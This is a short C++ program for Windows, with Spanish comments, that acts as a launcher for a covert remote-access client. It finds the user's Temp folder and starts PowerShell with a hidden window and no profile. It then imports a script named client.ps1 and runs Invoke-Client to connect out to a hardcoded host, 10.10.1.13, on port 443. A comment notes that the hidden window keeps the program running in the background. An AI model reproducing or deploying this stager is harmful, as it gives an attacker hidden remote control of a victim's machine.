
		#include <iostream>
		#include <winsock2.h>
		#include <windows.h>
		#include <string>
		#pragma comment(lib, "urlmon.lib")
		#include <lmcons.h>
		#include <cstring>
		#define PSSCRIPT "client.ps1"
		#define IPADDR "10.10.1.13"
		using namespace std;

		int main(void){
		       string nombre_script = PSSCRIPT;
		       string ipaddr = IPADDR;
		       char username[UNLEN+1];
		       DWORD username_len = UNLEN+1;
		       GetUserName(username, &username_len);
		       string user(username);      
		       string ruta_script = "C:\\Users\\" + user + "\\AppData\\Local\\Temp\\" + nombre_script;
		       string strCMD = "start powershell.exe -noprofile -windowstyle hidden -Command "\&Import-Module "+ruta_script+"; Invoke-Client -ServerIP "+ipaddr+" -Port 443";
		       system(strCMD.c_str()); //si -windowstyle hidden, entonces se ejecuta en segundo plano.

		}
		